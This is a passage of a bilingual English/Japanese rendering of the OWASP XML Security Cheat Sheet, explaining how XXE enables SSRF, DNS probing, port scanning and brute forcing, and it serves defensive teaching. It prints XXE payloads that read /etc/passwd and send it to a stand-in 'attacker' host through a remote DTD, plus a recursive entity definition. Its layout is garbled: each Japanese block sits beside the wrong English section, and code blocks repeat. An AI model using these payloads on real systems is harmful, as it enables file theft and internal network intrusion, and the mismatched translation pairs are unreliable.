**前述の XML は `xxe` という名前のエンティティを定義しており、これは実際には `/etc/passwd` の内容であり、`includeme` タグ内で展開されます。パーサが外部エンティティへの参照を許可している場合、そのファイルの内容が XML レスポンスまたはエラー出力に含まれる可能性があります。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### External DNS Resolution

**Sometimes it is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.** This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### サーバーサイドリクエストフォージェリ

**サーバーサイドリクエストフォージェリ (Server Side Request Forgery: SSRF) は、サーバーが悪意ある XML スキーマを受け取り、それによって HTTP/HTTPS/FTP などを介してファイルなどのリモートリソースを取得させられる場合に発生します。** SSRF は、リモートファイルの取得、ファイルを反射して返せない場合の XXE の証明、ポートスキャン、内部ネットワークへのブルートフォース攻撃に使用されてきました。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### External Connection

Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### 外部 DNS 解決

**アプリケーションに任意のドメイン名のサーバーサイド DNS ルックアップを実行させられる場合があります。** これは SSRF の最も単純な形式の一つですが、攻撃者は DNS トラフィックを分析する必要があります。Burp にはこの攻撃をチェックするプラグインがあります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
 %xxe;
]>
```

```xml
<!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### File Retrieval with Parameter Entities

Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### 外部接続

XXE があり、ファイルを取得できない場合でも、リモート接続を確立できるかをテストできます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
 %dtd;
]>
<root>&send;</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
 %xxe;
]>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Here the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) defines two external parameter entities: `file` loads a local file, and `dtd` which loads a remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). The remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) should contain something like this:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### パラメータエンティティによるファイル取得

パラメータエンティティは、URL 参照を使用してコンテンツを取得できるようにします。次の悪意ある XML 文書を考えてください。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
%all;
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
 %dtd;
]>
<root>&send;</root>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The second [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) causes the system to send the contents of the `file` back to the attacker's server as a parameter of the URL.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

ここで [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) は二つの外部パラメータエンティティを定義しています。`file` はローカルファイルを読み込み、`dtd` はリモート [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を読み込みます。リモート [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) には、次のような内容が含まれるべきです。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
%all;
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Port Scanning

The amount and type of information generated by port scanning will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex:

**1) Complete Disclosure**: This is the simplest and most unusual scenario, with complete disclosure you can clearly see what's going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host.

**2) Error-based**: If you are unable to see the response from the remote server, you may be able to use the information generated by the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

二つ目の [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) により、システムは `file` の内容を URL のパラメータとして攻撃者のサーバーに送り返します。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**3) Timeout-based**: The scanner could generate timeouts when it connects to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### ポートスキャン

ポートスキャンによって生成される情報の量と種類は、実装の種類に依存します。レスポンスは、簡単なものから複雑なものまで、次のように分類できます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**4) Time-based**: Sometimes it may be difficult to tell the differences between closed and open ports because the results are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host, then you should analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish if it is performed in higher latency networks.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**1) 完全な開示**: これは最も単純で最も珍しいシナリオです。完全な開示では、問い合わせ対象サーバーから完全なレスポンスを受け取ることで、何が起きているかを明確に確認できます。リモートホストへの接続時に何が起こったかを正確に表現できます。

**2) エラーベース**: リモートサーバーからのレスポンスを確認できない場合でも、エラーレスポンスによって生成される情報を使用できる可能性があります。接続を確立しようとしたときに何が問題だったかを SOAP Fault 要素で詳細に漏えいする Web サービスを考えてください。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Brute Forcing

**Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the `username` and `password` as part of the URI scheme (http, ftp, etc).** For example, see the following example:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**3) タイムアウトベース**: スキャナは、スキーマと基盤実装に応じて、開いているポートまたは閉じているポートに接続するときにタイムアウトを生成する可能性があります。閉じたポートに接続しようとしているときにタイムアウトが発生する場合 (1 分かかることがあります)、有効なポートに接続したときの応答時間は非常に短くなります (たとえば 1 秒)。開いているポートと閉じているポートの違いはかなり明確になります。

**4) 時間ベース**: 結果が非常に微妙であるため、閉じたポートと開いているポートの違いを見分けるのが難しい場合があります。ポートの状態を確実に知る唯一の方法は、各ホストに到達するために必要な時間を複数回測定し、その後、各ポートの平均時間を分析して各ポートの状態を判定することです。この種の攻撃は、高遅延ネットワークで実行される場合、達成が困難になります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<!DOCTYPE root [
 <!ENTITY user SYSTEM "http://username:password@example.com:8080">
]>
<root>&user;</root>
```

</div>

<div className="bilingualPair">

<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### ブルートフォース

**攻撃者がポートスキャンを実行できることを確認したら、ブルートフォース攻撃は `username` と `password` を URI スキーム (http、ftp など) の一部として埋め込むだけで実行できます。** たとえば、次の例を参照してください。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<!DOCTYPE root [
 <!ENTITY user SYSTEM "http://username:password@example.com:8080">
]>
<root>&user;</root>
```

</div>

</section>
</div>

## References

<div className="referenceFooter">

**When the definition of an element `A` is another element `B`, and that element `B` is defined as element `A`, that schema describes a circular reference between elements:**

```xml
<!DOCTYPE A [
 <!ELEMENT A ANY>
 <!ENTITY A "<A>&B;</A>">
 <!ENTITY B "&A;">
]>
<A>&A;</A>
```

</div>


## Attribution

<div className="attributionFooter">

- Original: XML Security Cheat Sheet
- Source: https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html
- Copyright: Cheat Sheets Series Team
- License: Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
- License URL: https://creativecommons.org/licenses/by-sa/4.0/
- Changes: English original retained for comparison. Japanese translation added. Bilingual display generated from official source and local Japanese translation.
- Retrieved: 2026-05-20

</div>
